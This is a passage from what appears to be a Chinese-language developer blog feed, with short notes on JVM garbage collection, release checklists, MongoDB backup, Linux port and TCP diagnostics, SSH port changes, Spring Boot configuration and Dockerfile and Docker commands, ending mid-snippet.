在年轻代中经历了N(默认15)次垃圾回收后仍然存活的对象，就会被放到年老代中。因此，可以认为年老代中存放的都是一些生命周期较长的对象。年老代对象越来越多，我们就需要启动Major GC和Full GC(全量回收)，来一次大扫除，全面清理年轻代区域和年老代区域。</p><ol start="3"><li>持久代</li></ol><p>　　用于存放静态文件，如Java类、方法等。持久代对垃圾回收没有显著影响。</p><h3 id="三种-GC"><a href="#三种-GC" class="headerlink" title="三种 GC"></a>三种 GC</h3><p><strong>Minor GC</strong></p><p>用于清理年轻代区域。Eden区满了就会触发一次Minor GC。清理无用对象，将有用对象复制到“Survivor1”、“Survivor2”区中(这两个区，大小空间也相同，同一时刻Survivor1和Survivor2只有一个在用，一个为空)</p><p><strong>Major GC</strong></p><p>用于清理老年代区域。</p><p><strong>Full GC</strong></p><p>用于清理年轻代、年老代区域。 成本较高，会对系统性能产生影响。</p><h3 id="垃圾回收过程"><a href="#垃圾回收过程" class="headerlink" title="垃圾回收过程"></a>垃圾回收过程</h3><ol><li>新创建的对象，绝大多数都会存储在Eden中，</li><li>当Eden满了（达到一定比例）不能创建新对象，则触发垃圾回收（GC），将无用对象清理掉，然后剩余对象复制到某个Survivor中，如S1，同时清空Eden区</li><li>当Eden区再次满了，会将S1中的不能清空的对象存到另外一个Survivor中，如S2，同时将Eden区中的不能清空的对象，也复制到S1中，保证Eden和S1，均被清空。</li><li>重复多次(默认15次)Survivor中没有被清理的对象，则会复制到老年代Old(Tenured)区中</li><li>当Old区满了，则会触发一个一次完整地垃圾回收（FullGC），之前新生代的垃圾回收称为（minorGC）</li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.sxt.cn/Java_jQuery_in_action/The_garbage_collection_mechanism.html" target="_blank" rel="noopener">https://www.sxt.cn/Java_jQuery_in_action/The_garbage_collection_mechanism.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CI/CD 搭建清单</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/ci-cd-checklist/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/ci-cd-checklist/</url>
      
        <content type="html"><![CDATA[<ul><li>代码库<ul><li>gitlab </li><li>crendential</li></ul></li><li>Jenkins<ul><li>搭建 Jenkin</li><li>配置 salve</li><li></li></ul></li><li>构建<ul><li></li><li>web hook </li></ul></li><li>部署<ul><li>非生产</li><li>生产</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mongodb 的数据导入\导出</title>
      <link href="/mongodb/mongodb/data-export-import/"/>
      <url>/mongodb/mongodb/data-export-import/</url>
      
        <content type="html"><![CDATA[<p>mongodb数据备份和恢复主要分为二种：一种是针对库的mongodump和mongorestore，一种是针对库中表的mongoexport和mongoimport</p><p>mongorestore 比较常用。</p><h2 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h2><blockquote><p>mongodump -d SERVERLOG -o /data/mongobak/SERVERLOG.bak/</p></blockquote><h2 id="导入指定文件夹下的数据"><a href="#导入指定文件夹下的数据" class="headerlink" title="导入指定文件夹下的数据"></a>导入指定文件夹下的数据</h2><blockquote><p>mongorestore -d &lt;db_name&gt; &lt;bson_folder&gt;</p></blockquote><p>windows 下找到 C 盘中 mongdodb/server/bin, mongdo提供了一些工具软件</p><blockquote><p>mongorestore.exe -d &lt;db_name&gt; &lt;bson_folder&gt;</p></blockquote><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://docs.mongodb.com/manual/reference/program/mongorestore/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/program/mongorestore/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> mongodb </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>上线检查清单</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/release-note/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/release-note/</url>
      
        <content type="html"><![CDATA[<h2 id="上线前"><a href="#上线前" class="headerlink" title="上线前"></a>上线前</h2><ul><li>创建任务卡</li><li>创建代码库上线分支</li><li>提前发送业务中断信息，包括邮件和悬挂系统通知</li><li>准备部署脚本 （例如 shell、ansible）和线上配置文件（例如Nginx配置）</li><li>制定上线计划</li><li>在低版本演练上线计划</li><li>在低版本演练灾备恢复</li><li>记录当前系统运行的版本号，软件包，需要准备好回退计划</li><li>有条件的，进行安全测试</li></ul><h2 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h2><ul><li>执行上线动作至少需要两人pair操作（大量误操作造成事故的案例），可以创建线上会议直播上线操作</li><li>停服后需要监控数据流量，确保流量为0后再进行数据、配置和线上软件包的备份</li><li>上线失败后使用回退计划</li><li>尽量不对线上环境进行手动配置，如果无法实现自动化部署，应添加到上线计划中</li></ul><h2 id="上线完成后"><a href="#上线完成后" class="headerlink" title="上线完成后"></a>上线完成后</h2><ul><li>使用专用的 health check 接口检查系统健康状态</li><li>核对线上系统的版本号是否和预期一致，如果没有版本号指标，可以通过服务部署时间确</li><li>检查服务器负载是否在健康范围内</li><li>其他授权下的线上测试</li><li>检查日志平台是否有日志到达</li><li>检查日志中是否有错误信息</li><li>发送业务恢复邮件和系统通知</li><li>上线完成后，需要当前线上环境的信息更新文档</li><li>新的IP地址、服务器配置信息等</li><li>最新线上的版本号、软件包、配置文件</li><li>上线计划</li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>java 性能监控</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-apm/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-apm/</url>
      
        <content type="html"><![CDATA[<p>使用 APM 技术可以监控 java 的堆栈信息、JVM 信息等。</p>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux nc 工具零时监听端口</title>
      <link href="/linux/linux/linux-nc/"/>
      <url>/linux/linux/linux-nc/</url>
      
        <content type="html"><![CDATA[<p>为了测试端口是否开放，需要临时开启端口</p><p>可以使用文件描述符:</p><blockquote><p>lsof -i:6066</p></blockquote><p>以及</p><blockquote><p>nc -l 0.0.0.0 6066<br>netstat -ntlp 就能查看端口了</p></blockquote><h2 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h2><ul><li><a href="https://www.v2ex.com/amp/t/459497" target="_blank" rel="noopener">https://www.v2ex.com/amp/t/459497</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 查看端口状态</title>
      <link href="/linux/linux/linux-port/"/>
      <url>/linux/linux/linux-port/</url>
      
        <content type="html"><![CDATA[<p>主要使用 netstat 命令，各个参数说明如下：</p><p>　　-t : 指明显示TCP端口</p><p>　　-u : 指明显示UDP端口</p><p>　　-l : 仅显示监听套接字(所谓套接字就是使应用程序能够读写与收发通讯协议(protocol)与资料的程序)</p><p>　　-p : 显示进程标识符和程序名称，每一个套接字/端口都属于一个程序。</p><p>　　-n : 不进行DNS轮询，显示IP(可以加速操作)</p><p>查看所有的 TCP 端口</p><blockquote><p>netstat -ntlp   </p></blockquote><p>统计端口连接数量</p><blockquote><p>netstat -pnt |grep :3306 |wc</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>查看 linux 中的 TCP 连接数</title>
      <link href="/linux/linux/linux-tcp-connections/"/>
      <url>/linux/linux/linux-tcp-connections/</url>
      
        <content type="html"><![CDATA[<p>查看连接到本机的连接</p><blockquote><p>netstat -an</p></blockquote><p>统计 80 端口的连接数</p><blockquote><p>netstat -nat|grep -i “80”|wc -l</p></blockquote><p>统计httpd协议连接数</p><blockquote><p>ps -ef|grep httpd|wc -l</p></blockquote><p>统计已连接上的，状态为“established</p><blockquote><p>netstat -na|grep ESTABLISHED|wc -l</p></blockquote><p>查出哪个IP地址连接最多</p><blockquote><p>netstat -na|grep ESTABLISHED|awk {print $5}|awk -F: {print $1}|sort|uniq -c|sort -r +0n</p></blockquote><blockquote><p>netstat -na|grep SYN|awk {print $5}|awk -F: {print $1}|sort|uniq -c|sort -r +0n</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.cnblogs.com/felixzh/p/7737160.html" target="_blank" rel="noopener">https://www.cnblogs.com/felixzh/p/7737160.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 常用线上排错命令</title>
      <link href="/linux/linux/linux-common-ops/"/>
      <url>/linux/linux/linux-common-ops/</url>
      
        <content type="html"><![CDATA[<h2 id="安装一些调试工具"><a href="#安装一些调试工具" class="headerlink" title="安装一些调试工具"></a>安装一些调试工具</h2><blockquote><p>yum install -y telnet</p></blockquote><blockquote><p>yum install git</p></blockquote><blockquote><p>yum install httpd-tools</p></blockquote><blockquote><p>yum install java-1.8.0-openjdk.x86_64</p></blockquote><h2 id="查看打开的文件数"><a href="#查看打开的文件数" class="headerlink" title="查看打开的文件数"></a>查看打开的文件数</h2><p>linux tcp 连接是通过文件描述符 FD 也就是每个链接创建了一个虚拟文件。系统的连接数是有限制，如果连接数超过最大数量会得到一个异常。如果是一些流忘记关闭，会造成此类错误。</p><blockquote><p>lsof -n | awk ‘{print $2}’ sort | uniq -c | sort -nr | more</p></blockquote><p>显示的左侧是句柄数，右侧是进程号，可以查看当前系统打开的句柄数量</p><pre><code>1117 83316 714 486 525 83525 465 83649 411 64791</code></pre><p>通过</p><blockquote><p>ps -ax | grep 83316</p></blockquote><p>查看当前进程的应用程序</p><blockquote><p>83316 ??        14:48.23 /Applications/IntelliJ IDEA.app/Contents/MacOS/idea</p></blockquote><p>发现 idea 开了 1117 个文件</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>SSH 修改端口</title>
      <link href="/linux/linux/ssh-change-port/"/>
      <url>/linux/linux/ssh-change-port/</url>
      
        <content type="html"><![CDATA[<p>修改修改配置文件</p><blockquote><p>vim /etc/ssh/sshd_config</p></blockquote><p>找到#port 22 这一行，默认端口 22，可以添加多个端口</p><p>重启 ssh 服务即可</p><blockquote><p>sudo systemctl restart sshd</p></blockquote><p>可能需要配置防火墙</p><p>重启时遇到错误  </p><pre><code>Job for sshd.service failed because the control process exited with error code. See &quot;systemctl status sshd.service&quot; and &quot;journalctl -xe&quot; for details.[ansible@manager1 ~]$ systemctl status sshd.service● sshd.service - OpenSSH server daemon   Loaded: loaded (/usr/lib/systemd/system/sshd.service; enabled; vendor preset: enabled)   Active: activating (auto-restart) (Result: exit-code) since Wed 2019-12-18 14:22:24 UTC; 29s ago     Docs: man:sshd(8)           man:sshd_config(5)  Process: 6503 ExecStart=/usr/sbin/sshd -D $OPTIONS (code=exited, status=255) Main PID: 6503 (code=exited, status=255)</code></pre><p>需要关闭 SeLinux</p><p>查看 selinux 状态</p><blockquote><p>sestatus </p></blockquote><p>修改配置</p><blockquote><p>vim /etc/selinux/config</p></blockquote><p>编辑配置并修改</p><blockquote><p>SELINUX=disabled</p></blockquote><p>然后重启即可</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>关闭 se linux <a href="https://www.landui.com/help/show-8381" target="_blank" rel="noopener">https://www.landui.com/help/show-8381</a></li><li><a href="https://zhidao.baidu.com/question/1951738957393461188.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/1951738957393461188.html</a></li><li>关于重启失败的错误 <a href="https://stackoverflow.com/questions/11672525/centos-6-3-ssh-bind-to-port-xxx-on-0-0-0-0-failed-permission-denied" target="_blank" rel="noopener">https://stackoverflow.com/questions/11672525/centos-6-3-ssh-bind-to-port-xxx-on-0-0-0-0-failed-permission-denied</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mongodb 中时间戳的问题</title>
      <link href="/mongodb/mongodb/bson-time-stamp/"/>
      <url>/mongodb/mongodb/bson-time-stamp/</url>
      
        <content type="html"><![CDATA[<p>Java 中 BsonTimestamp 的时间是秒数。</p><p>注意生成当前时间戳的时候需要做一些处理，例如 </p><blockquote><p>new BSONTimestamp((int) (now.getTime() / 1000), 0))</p></blockquote><p>推荐使用 BSONTimestamp 类型。</p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li><a href="https://www.programcreek.com/java-api-examples/index.php?api=org.bson.types.BSONTimestamp" target="_blank" rel="noopener">https://www.programcreek.com/java-api-examples/index.php?api=org.bson.types.BSONTimestamp</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> mongodb </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 项目中常见的日志配置</title>
      <link href="/Spring/spring/springboot-logging/"/>
      <url>/Spring/spring/springboot-logging/</url>
      
        <content type="html"><![CDATA[<h2 id="建议开启-webclient-相关的日志"><a href="#建议开启-webclient-相关的日志" class="headerlink" title="建议开启 webclient 相关的日志"></a>建议开启 webclient 相关的日志</h2><h3 id="使用-RestTemplate"><a href="#使用-RestTemplate" class="headerlink" title="使用 RestTemplate"></a>使用 RestTemplate</h3><p>使用 application.properties 的方法</p><pre><code>logging.level.org.springframework.web.client=DEBUG</code></pre><p>使用 application.yml 的方法</p><pre><code>logging:  level:      root: WARN    org.springframework.web.client: DEBUG</code></pre><h3 id="使用-FeignClient"><a href="#使用-FeignClient" class="headerlink" title="使用 FeignClient"></a>使用 FeignClient</h3><p>增加一个 Feign 配置类</p><pre><code>@Configurationpublic class FeignConfiguration {    @Bean    Logger.Level feignLoggerLevel() {        //这里记录所有，根据实际情况选择合适的日志level        return Logger.Level.FULL;    }}</code></pre><p>在 feign 的接口上增加配置类 </p><pre><code>configuration = FeignConfiguration.class</code></pre><p>修改日志级别</p><pre><code>logging.level.&lt;FeignClient类的全路径&gt; = DEBUG</code></pre><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://stackoverflow.com/questions/7952154/spring-resttemplate-how-to-enable-full-debugging-logging-of-requests-responses" target="_blank" rel="noopener">https://stackoverflow.com/questions/7952154/spring-resttemplate-how-to-enable-full-debugging-logging-of-requests-responses</a></li><li>FeignClient日志打印 <a href="https://www.cnblogs.com/lemondada/p/11270648.html" target="_blank" rel="noopener">https://www.cnblogs.com/lemondada/p/11270648.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Jenkins</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/jenkins/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/jenkins/</url>
      
        <content type="html"><![CDATA[<p>Jenkins 安装可以 Docker 非常容易的安装，需要注意安装后升级 Jenkins，才能使用很多插件，以及安装一些必要的插件。</p><h2 id="常用的插件"><a href="#常用的插件" class="headerlink" title="常用的插件"></a>常用的插件</h2><h3 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h3><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>可以直接配置一个 DOCKER_HOST 然后访问部署 docker</p><h3 id="Monitor"><a href="#Monitor" class="headerlink" title="Monitor"></a>Monitor</h3><h3 id="Docker-Swarm"><a href="#Docker-Swarm" class="headerlink" title="Docker Swarm"></a>Docker Swarm</h3><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>docker 安装指南 <a href="https://jenkins.io/zh/doc/book/installing/" target="_blank" rel="noopener">https://jenkins.io/zh/doc/book/installing/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>关机和重启命令</title>
      <link href="/linux/linux/linux-shutdown/"/>
      <url>/linux/linux/linux-shutdown/</url>
      
        <content type="html"><![CDATA[<h2 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h2><blockquote><p>sudo shutdown</p></blockquote><h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><blockquote><p>sudo shutdown -r 0</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Resttemplat 使用</title>
      <link href="/Spring/spring/spring-rest-template/"/>
      <url>/Spring/spring/spring-rest-template/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-boot-2-0-后定义方式"><a href="#Spring-boot-2-0-后定义方式" class="headerlink" title="Spring boot 2.0 后定义方式"></a>Spring boot 2.0 后定义方式</h2><p>Spring boot 2.0 后可以使用 RestTemplateBuilder 来定义，下面是一个定义 bean 并设置超时时间的方法。</p><pre><code>@Configurationpublic class RestConfig {    @Bean    public RestTemplate restTemplate(RestTemplateBuilder builder) {        return builder                .setConnectTimeout(Duration.ofMillis(3000))                .setReadTimeout(Duration.ofMillis(3000))                .build();    }}</code></pre><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>定义 RestTemplate 方法 <a href="https://stackoverflow.com/questions/13837012/spring-resttemplate-timeout" target="_blank" rel="noopener">https://stackoverflow.com/questions/13837012/spring-resttemplate-timeout</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Dockerfile 详解</title>
      <link href="/docker/docker/dockerfile/"/>
      <url>/docker/docker/dockerfile/</url>
      
        <content type="html"><![CDATA[<h2 id="Dockerfile-编写基础"><a href="#Dockerfile-编写基础" class="headerlink" title="Dockerfile 编写基础"></a>Dockerfile 编写基础</h2><p>我们可以通过编写 Dockerfile 构建出 Docker 镜像，Dockerfile 可以看作为一个用于构建镜像的 Linux 命令集。Docker 在构建镜像的过程中，执行这个命令集，安装必要的软件以及一些基本的配置。</p><p>一个基本的 Dockerfle</p><pre><code>FROM docker.io/nginxCOPY ./test.html /usr/share/nginx/htm/index.htmlCOPY nginx.conf /etc/nginx/conf.d/default.confCMD [&quot;nginx&quot;,&quot;-g&quot;,&quot;daemon off;&quot;]</code></pre><ul><li>FROM 指明基础镜像，COPY 为复制资源文件命令， CMD 为容器启动时的命令。</li></ul><p>“Dockerfile” 是 Docker 默认的的文件名，也可使用 -f 参数进行指定其他文件名。</p><blockquote><p>docker build -t user/image:tag .<br>docker build -t user/image:new -f Dockerfile.new</p></blockquote><h3 id="Dockerfile-编写的注意事项"><a href="#Dockerfile-编写的注意事项" class="headerlink" title="Dockerfile 编写的注意事项"></a>Dockerfile 编写的注意事项</h3><p>尽可能自动化，避免 Y/n 提示导致构建失败。</p><p>考虑命令的顺序,后面的命令会依赖前面的结果。</p><p>如果很长的命令可以使用 \&amp;&amp; 来进行连接,例如</p><pre><code>RUN echo &#39;this is a long message&#39; \&amp;&amp; echo &#39;hello&#39;</code></pre><p>如果 Dockerfile 存放的目录还有其他文件，例如 node_modules 等超大型文件集合，Docker 也会发送到 Daemon 去构建，因此可以使用 .dockerignore 来排除文件，加快构建速度。.dockerignore 文件的语法类似于 .gitignore。</p><p>另外，一个容器最好只做一件事情，如果将数据库、前端静态页面、后端网站等都放到一个容器中，这样就失去了容器的意义。如果需要编排各种应用，可以使用 docker-compose 进行编排。</p><h2 id="Dockerfile-命令"><a href="#Dockerfile-命令" class="headerlink" title="Dockerfile 命令"></a>Dockerfile 命令</h2><h3 id="解析器命令"><a href="#解析器命令" class="headerlink" title="解析器命令"></a>解析器命令</h3><p>解析器命令是可选的，它影响 Dockerfile 后续的处理方式。解析器命令告诉 Docker 如何处理后续的命令，使用注释的形式，写下 FROM 命令之前，否则会被作为注释处理。</p><p>目前只有一个解析命令，escape </p><pre><code># escape=`FROM ...COPY testfile.txt c:\\</code></pre><p>因为在 windows 下转义字符为 \ 因此 c:\ 会被解析成 c:\</p><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><p>FORM 命令用来表明，使用那个镜像作为基础构建，一般情况下都有基础镜像。FROM 必须是 Dockerfile 的第一句命令。</p><blockquote><p>FROM <a href="imageName:tag" target="_blank" rel="noopener">imageName:tag</a></p></blockquote><p>可以编写多个 FROM 会以最后一个镜像为准。</p><h3 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h3><p>指定维护者，方便其他人联系作者，这个命令已经弃用，可以使用 LABEL 命令。</p><blockquote><p>MAINTAINER NAME <email></email></p></blockquote><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>指定在编译阶段的命令， RUN 会在 shell 环境下执行命令，用于安装软件或者做配置使用。</p><blockquote><p>RUN echo Hi</p></blockquote><p>RUN 命令会在当前的镜像的顶层执行命令，然后 commit 一个中间镜像，提交的镜像会在下一个 RUN 中使用。 Docker 构建完成后会删除中间镜像。</p><p>使用 RUN 的格式为 </p><blockquote><p>RUN [“程序名”,”参数1”,”参数2”]</p></blockquote><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>ENV 命令用来执行 docker run 命令时设置的环境变量，这个环境变量可以在后续的命令中使用。</p><blockquote><p>ENV <key> <value></value></key></p></blockquote><p>定义的变量可以通过另种方式在 Dockerfile 中使用</p><ul><li>$variable</li><li>#{variable}</li></ul><p>尽量把 ENV 命令写成一个命令，因为每一个命令都是一个镜像层，合并之后的机构会变得更加简单和直观。</p><blockquote><p>ENV var1=value \<br>    var2=value2</p></blockquote><p>这些变量可以通过 docker run –env <key> = <value> 在运行更改，也可以使用 docker inspect 查看镜像或者容器中的变量。</value></key></p><h3 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h3><p>ARG 定义的参数用法和 ENV 一样，但是构建结束后会消失。</p><blockquote><p>ARG test=true</p></blockquote><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>作用和 COPY 类似，可以添加文件到容器中。同时支持从 URL 中下载文件到容器中，不过 ADD 会比 COPY 构建出来的镜像文件更大。</p><p>ADD 不能使用当前目录之外的文件，例如不能使用 add ../ 等路径。</p><h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><p>用于标明这个镜像的应用会监听某个端口，并且能将这个端口映射到主机的网络界面上。</p><p>EXPOSE 只负责处理容器内部的监听端口，如果 Docker 不在 RUN 的时候给容器分配端口映射，则外部无法访问容器 EXPOSE 设置的端口。</p><h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p>CMD 提供了容器启动时默认执行命令，例如 java -jar app.jar 启动 Spring boot 项目。CMD 与 ENTRYPOINT 的功能机位相似，区别在于 CMD 只能使用一次，后面的会覆盖前面的。ENTRYPOINT 可以定义多次。</p><p>同时 Docker run 也会覆盖 CMD 命令。</p><pre><code>FROM ubuntuCMD [&quot;echo&quot;,&quot;Hi&quot;]</code></pre><p>构建后运行，会输出 Hi，如果使用如下命令</p><blockquote><p>docker run 10d628b340ea echo “test”</p></blockquote><p>结果会输出 test，RUN 的时候会覆盖 RUN 的命令。</p><h3 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h3><p>ENTRYPOINT 相当于固化了 CMD 命令无法被修改，也无法被 RUN 覆盖。</p><p>当使用 ENTRYPONT 的时候，CMD 以及 RUN 命令都会作为参数传递给 ENTRYPOINT</p><pre><code>FROM ubuntuENTRYPOINT [&quot;echo&quot;]</code></pre><p>当我们构建并运行时，需要给一个参数 </p><blockquote><p>docker run 46e76bb0a870 “result”</p></blockquote><h3 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h3><p>用于指明一个数据卷，Docker 容器最好的是无状态的，数据以及状态由数据卷提供。</p><pre><code>FROM ubuntuRUN mkdir /app &amp;&amp; echo &quot;Hello&quot; &gt; /app/test.txtVOLUME [&quot;/Users/nlin/www/deployment-automation/app-examples/docker-test/local&quot;,&quot;/app&quot;]CMD [&quot;cat&quot;,&quot;/app/test.txt&quot;]</code></pre><p>在运行时候可以使用 -v 参数映射 （推荐这种做法）</p><blockquote><p>docker run  –rm -v /Users/nlin/www/deployment-automation/app-examples/docker-test/local:/app  521522ce40f6 </p></blockquote><h2 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h2><p>USER 命令用于指定运行容器时，使用的用户，默认为 ROOT</p><pre><code>USER mysql</code></pre><p>在运行时候可以使用 -u 动态指定。</p><h2 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h2><p>WORKDIR 用于指定 RUN、CMD 等命令的工作目录，相当于 cd，多个 WORKDIR会产生连续的效果。</p><pre><code>WORKDIR /aWORKDIR bWORKDIR c</code></pre><p>相当于 cd /a/b/c</p><h3 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h3><p>ONBUILD 用于在子镜像的 FROM 之前运行，相当于子镜像中的一个钩子。这个命令不会在当前命令中执行。</p><h3 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h3><p>给镜像打上标签，尽量写在一起，减少构建过程的时间</p><pre><code>LABEL label1=xxx label2=xxx</code></pre><h3 id="STOPSIGNAL"><a href="#STOPSIGNAL" class="headerlink" title="STOPSIGNAL"></a>STOPSIGNAL</h3><p>用于容器停止时的信号</p><pre><code>STOPSIGNAL SIGKILL </code></pre><p>这样写可以在容器停止时，发送一个信号给运行的程序。</p><h3 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h3><p>定期发送一个 HEALTHCHECK 信号</p><pre><code>HEALTHCHECK --interval=10s --timeout=3s \    CMD curl -f http://localhost/ || exit 1</code></pre><p>这样在容器运行时检查系统是否正常，然后退出。</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Docker 基础</title>
      <link href="/docker/docker/docker-basic/"/>
      <url>/docker/docker/docker-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>docker pull 拉取镜像</p><blockquote><p>docker pull userxy2015/ngnix</p></blockquote><p>docker images 查看所有的本地镜像</p><blockquote><p>docker images </p></blockquote><p>docker rmi 删除不必要的镜像</p><blockquote><p>docker rmi userxy2015/ngnix</p></blockquote><p>docker run 启动容器</p><blockquote><p>docker run -p 8080:80 -d docker.io/nginx</p></blockquote><ul><li>-p 参数为设置端口映射</li><li>-d 为后台运行 –daemon </li></ul><p>docker exec 进入容器</p><blockquote><p>docker exec -it ngnix bash </p></blockquote><p>docker build 构建容器，在当前目录下加入一个 Dockerfile</p><pre><code>FROM docker.io/nginxCOPY ./test.html /usr/share/nginx/htm/index.html</code></pre><blockquote><p>docker build -t linksgo2011/frontend .</p></blockquote><p>-t 指的是给容器打一个标签，最后的 . 指出 dockerfile的位置</p><p>docker login 登录 docker hub</p><blockquote><p>docker login 然后输入密码</p></blockquote><p>docker push 推 docker 镜像到仓库，需要提前建一个 linksgo2011/frontend 仓库。<a href="https://hub.docker.com/repository" target="_blank" rel="noopener">https://hub.docker.com/repository</a></p><blockquote><p>docker push linksgo2011/frontend:latest</p></blockquote><p>如果之前的镜像已经存在，可以通过 </p><p>docker tag 旧标签名 新标签名</p><blockquote><p>docker frontend linksgo2011/frontend</p></blockquote><p>docker commit 将当前的容器提交为镜像，一般不常用</p><blockquote><p>docker commit c9e5bb7a524f linksgo2011/frontend</p></blockquote><p>拷贝文件到 docker 容器 </p><blockquote><p>docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</p></blockquote><h2 id="docker-的版本说明"><a href="#docker-的版本说明" class="headerlink" title="docker 的版本说明"></a>docker 的版本说明</h2><p>docker 仓库的版本约定为 用户/仓库/标签</p><p>例如 linksgo2011/fonrtend:01 标签的镜像推送时，会推送到 linksgo2011 下面的 fonrtend 中为 01 标签</p><p>如果在构建镜像时候，不指定最后的标签名称，会使用 latest 标签，并且每次会覆盖上一次的镜像。</p><h2 id="一些和-docker-相关的排错命令"><a href="#一些和-docker-相关的排错命令" class="headerlink" title="一些和 docker 相关的排错命令"></a>一些和 docker 相关的排错命令</h2><p>重启 docker daemon</p><blockquote><p>sudo systemctl restart docker</p></blockquote><h2 id="docker-清理镜像和容器"><a href="#docker-清理镜像和容器" class="headerlink" title="docker 清理镜像和容器"></a>docker 清理镜像和容器</h2><blockquote><p>docker container prune</p></blockquote><blockquote><p>docker image prune</p></blockquote><h2 id="用-ansible-操作-docker-时候需要使用-docker-for-Python-的插件"><a href="#用-ansible-操作-docker-时候需要使用-docker-for-Python-的插件" class="headerlink" title="用 ansible 操作 docker 时候需要使用 docker for Python 的插件"></a>用 ansible 操作 docker 时候需要使用 docker for Python 的插件</h2><p>在目标机上需要有 docker、Python、以及 python 的docker 插件</p><pre><code>- name: install certain python modules for docker  pip:    name: &quot;{{ item.name }}&quot;    version: &quot;{{ item.version }}&quot;    state: present  with_items:  - { name: docker, version: 2.0.0 